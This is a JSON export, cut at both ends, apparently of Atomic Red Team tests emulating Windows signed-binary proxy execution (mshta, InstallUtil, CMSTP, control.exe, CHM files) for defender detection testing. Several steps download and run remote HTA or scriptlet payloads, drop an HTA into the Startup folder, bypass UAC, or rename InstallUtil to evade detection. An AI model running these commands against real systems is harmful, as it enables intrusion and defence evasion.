["clacwm6d203c629mq95vy2f4z"], "tags": []}, {"data": {"name": "Mshta executes VBScript to execute malicious command", "shortName": "T1218.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Run a local VB script to run local user enumeration powershell command.\nThis attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.\nUpon execution, a new PowerShell windows will be opened that displays user information.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")\n", "successCriteria": null}], "techniqueIds": ["clacwm6d203c629mq95vy2f4z", "clacwm24b00kl29mqg0ypck3m"], "tags": []}, {"data": {"name": "Mshta Executes Remote HTML Application (HTA)", "shortName": "T1218.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | temp_file | temp_file location for hta | String | $env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta | \n | hta_url | URL to HTA file for execution | String | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta | "}, "executionSteps": [{"description": "$var =Invoke-WebRequest \"#{hta_url}\"\n$var.content|out-file \"#{temp_file}\"\nmshta \"#{temp_file}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6d203c629mq95vy2f4z", "clacwm24b00kl29mqg0ypck3m"], "tags": []}, {"data": {"name": "Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject", "shortName": "T1218.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_url | location of the payload | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct | "}, "executionSteps": [{"description": "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();\n", "successCriteria": null}], "techniqueIds": ["clacwm6d203c629mq95vy2f4z", "clacwm24b00kl29mqg0ypck3m"], "tags": []}, {"data": {"name": "Invoke HTML Application - Simulate Lateral Movement over UNC Path", "shortName": "T1218.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes an HTA Application with Simulate lateral movement over UNC Path.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | mshta_file_path | Location of mshta.exe | String | $env:windir\\system32\\mshta.exe | "}, "executionSteps": [{"description": "Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}", "successCriteria": null}], "techniqueIds": ["clacwm6d203c629mq95vy2f4z", "clacwm24b00kl29mqg0ypck3m"], "tags": []}, {"data": {"name": "Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler", "shortName": "T1218.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | rundll32_file_path | Location of rundll32.exe | Path | $env:windir\\system32\\rundll32.exe | \n | script_engine | Script Engine to use | String | JScript | \n | protocol_handler | Protocol Handler to use | String | About | "}, "executionSteps": [{"description": "Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}", "successCriteria": null}], "techniqueIds": ["clacwm6d203c629mq95vy2f4z", "clacwm24b00kl29mqg0ypck3m"], "tags": []}, {"data": {"name": "Invoke HTML Application - JScript Engine with Inline Protocol Handler", "shortName": "T1218.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes an HTA Application with JScript Engine and Inline Protocol Handler.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | mshta_file_path | Location of mshta.exe | Path | $env:windir\\system32\\mshta.exe | \n | script_engine | Script Engine to use | String | JScript | \n | protocol_handler | Protocol Handler to use | String | About | "}, "executionSteps": [{"description": "Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}", "successCriteria": null}], "techniqueIds": ["clacwm6d203c629mq95vy2f4z", "clacwm24b00kl29mqg0ypck3m"], "tags": []}, {"data": {"name": "Invoke HTML Application - Jscript Engine Simulating Double Click", "shortName": "T1218.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes an HTA Application using JScript script engine simulating double click.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | script_engine | Script Engine to use | String | JScript | \n | hta_file_path | HTA file name and or path to be used | String | Test.hta | "}, "executionSteps": [{"description": "Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick", "successCriteria": null}], "techniqueIds": ["clacwm6d203c629mq95vy2f4z", "clacwm24b00kl29mqg0ypck3m"], "tags": []}, {"data": {"name": "Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement", "shortName": "T1218.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | script_engine | Script Engine to use | String | JScript | \n | hta_file_path | HTA file name and or path to be used | String | Test.hta | \n | mshta_file_path | Location of mshta.exe | String | $env:windir\\system32\\mshta.exe | "}, "executionSteps": [{"description": "Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path}", "successCriteria": null}], "techniqueIds": ["clacwm6d203c629mq95vy2f4z", "clacwm24b00kl29mqg0ypck3m"], "tags": []}, {"data": {"name": "Invoke HTML Application - Direct download from URI", "shortName": "T1218.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes an HTA Application by directly downloading from remote URI.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | mshta_file_path | Location of mshta.exe | String | $env:windir\\system32\\mshta.exe | \n | hta_uri | URI to HTA | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta | "}, "executionSteps": [{"description": "Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}", "successCriteria": null}], "techniqueIds": ["clacwm6d203c629mq95vy2f4z", "clacwm24b00kl29mqg0ypck3m"], "tags": []}, {"data": {"name": "InstallUtil Uninstall method call - /U variant", "shortName": "T1218.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | test_harness | location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly | Path | PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1 | \n | assembly_dir | directory to drop the compiled installer assembly | Path | $Env:TEMP\\ | \n | invocation_method | the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable | String | Executable | \n | assembly_filename | filename of the compiled installer assembly | String | T1218.004.dll | "}, "executionSteps": [{"description": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "successCriteria": null}], "techniqueIds": ["clacwm5wl02vl29mqbma1at55", "clacwm1zb00h729mq1rulctlt"], "tags": []}, {"data": {"name": "InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant", "shortName": "T1218.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | test_harness | location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly | Path | PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1 | \n | assembly_dir | directory to drop the compiled installer assembly | Path | $Env:TEMP\\ | \n | invocation_method | the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable | String | Executable | \n | assembly_filename | filename of the compiled installer assembly | String | T1218.004.dll | "}, "executionSteps": [{"description": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "successCriteria": null}], "techniqueIds": ["clacwm5wl02vl29mqbma1at55", "clacwm1zb00h729mq1rulctlt"], "tags": []}, {"data": {"name": "InstallUtil Install method call", "shortName": "T1218.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the Install Method. Upon execution, version information will be displayed the .NET framework install utility.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | test_harness | location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly | Path | PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1 | \n | assembly_dir | directory to drop the compiled installer assembly | Path | $Env:TEMP\\ | \n | invocation_method | the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable | String | Executable | \n | assembly_filename | filename of the compiled installer assembly | String | T1218.004.dll | "}, "executionSteps": [{"description": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Install_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "successCriteria": null}], "techniqueIds": ["clacwm5wl02vl29mqbma1at55", "clacwm1zb00h729mq1rulctlt"], "tags": []}, {"data": {"name": "InstallUtil HelpText method call", "shortName": "T1218.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the Uninstall Method. Upon execution, help information will be displayed for InstallUtil.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | test_harness | location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly | Path | PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1 | \n | assembly_dir | directory to drop the compiled installer assembly | Path | $Env:TEMP\\ | \n | invocation_method | the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable | String | Executable | \n | assembly_filename | filename of the compiled installer assembly | String | T1218.004.dll | "}, "executionSteps": [{"description": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_HelpText_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "successCriteria": null}], "techniqueIds": ["clacwm5wl02vl29mqbma1at55", "clacwm1zb00h729mq1rulctlt"], "tags": []}, {"data": {"name": "InstallUtil evasive invocation", "shortName": "T1218.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, \"Running a transacted installation.\"\nwill be displayed, along with other information about the opperation. \"The transacted install has completed.\" will be displayed upon completion.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | test_harness | location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly | Path | PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1 | "}, "executionSteps": [{"description": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"$Env:windir\\System32\\Tasks\"\n$InstallerAssemblyFileName = 'readme.txt'\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"readme.txt\"\n$ExpectedOutput = 'Constructor_'\n\n# Explicitly set the directory so that a relative path to readme.txt can be supplied.\nSet-Location \"$Env:windir\\System32\\Tasks\"\n\nCopy-Item -Path \"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\" -Destination \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n    InstallUtilPath = \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nEvasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "successCriteria": null}], "techniqueIds": ["clacwm5wl02vl29mqbma1at55", "clacwm1zb00h729mq1rulctlt"], "tags": []}, {"data": {"name": "InstallUtil class constructor method call", "shortName": "T1218.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the installer assembly class constructor. Upon execution, version information will be displayed the .NET framework install utility.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | test_harness | location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly | Path | PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1 | \n | assembly_dir | directory to drop the compiled installer assembly | Path | $Env:TEMP\\ | \n | invocation_method | the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable | String | Executable | \n | assembly_filename | filename of the compiled installer assembly | String | T1218.004.dll | "}, "executionSteps": [{"description": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "successCriteria": null}], "techniqueIds": ["clacwm5wl02vl29mqbma1at55", "clacwm1zb00h729mq1rulctlt"], "tags": []}, {"data": {"name": "InstallHelper method call", "shortName": "T1218.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the InstallHelper class constructor runner instead of executing InstallUtil. Upon execution, no output will be displayed if the test\nexecuted successfuly.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | test_harness | location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly | Path | PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1 | \n | assembly_dir | directory to drop the compiled installer assembly | Path | $Env:TEMP\\ | \n | invocation_method | the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable | String | InstallHelper | \n | assembly_filename | filename of the compiled installer assembly | String | T1218.004.dll | "}, "executionSteps": [{"description": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "successCriteria": null}], "techniqueIds": ["clacwm5wl02vl29mqbma1at55", "clacwm1zb00h729mq1rulctlt"], "tags": []}, {"data": {"name": "CheckIfInstallable method call", "shortName": "T1218.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the CheckIfInstallable class constructor runner instead of executing InstallUtil. Upon execution, the InstallUtil test harness will be executed.\nIf no output is displayed the test executed successfuly.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | test_harness | location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly | Path | PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1 | \n | assembly_dir | directory to drop the compiled installer assembly | Path | $Env:TEMP\\ | \n | invocation_method | the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable | String | CheckIfInstallable | \n | assembly_filename | filename of the compiled installer assembly | String | T1218.004.dll | "}, "executionSteps": [{"description": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "successCriteria": null}], "techniqueIds": ["clacwm5wl02vl29mqbma1at55", "clacwm1zb00h729mq1rulctlt"], "tags": []}, {"data": {"name": "CMSTP Executing UAC Bypass", "shortName": "T1218.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | inf_file_uac | Path to the INF file | Path | PathToAtomicsFolder\\T1218.003\\src\\T1218.003_uacbypass.inf | "}, "executionSteps": [{"description": "cmstp.exe /s #{inf_file_uac} /au\n", "successCriteria": null}], "techniqueIds": ["clacwm62u031l29mqge2f3vsr", "clacwm1ft004a29mqbjpnc9km"], "tags": []}, {"data": {"name": "CMSTP Executing Remote Scriptlet", "shortName": "T1218.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adversaries may supply CMSTP.exe with INF files infected with malicious commands\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | inf_file_path | Path to the INF file | Path | PathToAtomicsFolder\\T1218.003\\src\\T1218.003.inf | "}, "executionSteps": [{"description": "cmstp.exe /s #{inf_file_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm62u031l29mqge2f3vsr", "clacwm1ft004a29mqbjpnc9km"], "tags": []}, {"data": {"name": "Control Panel Items", "shortName": "T1218.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates an adversary leveraging control.exe\nUpon execution calc.exe will be launched\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | cpl_file_path | path to cpl file | Path | PathToAtomicsFolder\\T1218.002\\bin\\calc.cpl | "}, "executionSteps": [{"description": "control.exe #{cpl_file_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm63c031z29mq3bdpapkq", "clacwm1j8006v29mq56jphoml"], "tags": []}, {"data": {"name": "Invoke CHM with Script Engine and Help Topic", "shortName": "T1218.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes a CHM file with a defined script engine, ITS Protocol Handler, and help topic extension.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | topic_extension | Default Help Topic | String | html | \n | hh_file_path | path of modified HH.exe | Path | $env:windir\\hh.exe | \n | infotech_storage_handler | Default InfoTech Storage Protocol Handler | String | its | \n | script_engine | Default Script Engine | String | JScript | \n | chm_file_path | Default path of CHM | String | Test.chm | "}, "executionSteps": [{"description": "Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}", "successCriteria": null}], "techniqueIds": ["clacwm6h903h729mqh407hr1n", "clacwm1i4005u29mqcq4b332t"], "tags": []}, {"data": {"name": "Invoke CHM with InfoTech Storage Protocol Handler", "shortName": "T1218.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes a CHM file with the ITS protocol handler.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | hh_file_path | path of modified HH.exe | Path | $env:windir\\hh.exe | \n | infotech_storage_handler | Default InfoTech Storage Protocol Handler | String | its | \n | chm_file_path | Default path of CHM | String | Test.chm | "}, "executionSteps": [{"description": "Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}", "successCriteria": null}], "techniqueIds": ["clacwm6h903h729mqh407hr1n", "clacwm1i4005u29mqcq4b332t"], "tags": []}, {"data": {"name": "Invoke CHM with default Shortcut Command Execution", "shortName": "T1218.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes a CHM file with the default Shortcut Command method.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | chm_file_path | Default path of CHM | String | Test.chm | \n | hh_file_path | path of modified HH.exe | Path | $env:windir\\hh.exe | "}, "executionSteps": [{"description": "Invoke-ATHCompiledHelp -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}", "successCriteria": null}], "techniqueIds": ["clacwm6h903h729mqh407hr1n", "clacwm1i4005u29mqcq4b332t"], "tags": []}, {"data": {"name": "Invoke CHM Simulate Double click", "shortName": "T1218.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes a CHM file simulating a user double click.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | chm_file_path | Default path of CHM | String | Test.chm | "}, "executionSteps": [{"description": "Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path}", "successCriteria": null}], "techniqueIds": ["clacwm6h903h729mqh407hr1n", "clacwm1i4005u29mqcq4b332t"], "tags": []}, {"data": {"name": "Invoke CHM Shortcut Command with ITS and Help Topic", "shortName": "T1218.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes a CHM file using the Shortcut Command method with a defined ITS Protocol Handler, and help topic extension.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | topic_extension | Default Help Topic | String | html | \n | hh_file_path | path of modified HH.exe | Path | $env:windir\\hh.exe | \n | infotech_storage_handler | Default InfoTech Storage Protocol Handler | string | its | \n | chm_file_path | Default path of CHM | String | Test.chm | "}, "executionSteps": [{"description": "Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}", "successCriteria": null}], "techniqueIds": ["clacwm6h903h729mqh407hr1n", "clacwm1i4005u29mqcq4b332t"], "tags": []}, {"data": {"name": "Decompile Local CHM File", "shortName": "T1218.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses hh.exe to decompile a local compiled HTML Help file.\nUpon successful execution the chm file will decompile to disk.\nReference:https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | local_chm_file | Local .chm payload | Path | PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm | "}, "executionSteps": [{"description": "hh.exe -decompile %temp% #{local_chm_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6h903h729mqh407hr1n"], "tags": []}, {"data": {"name": "Compiled HTML Help Remote Payload", "shortName": "T1218.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses hh.exe to execute a remote compiled HTML Help payload.\nUpon execution displays an error saying the file cannot be open\n\n\n**Supported 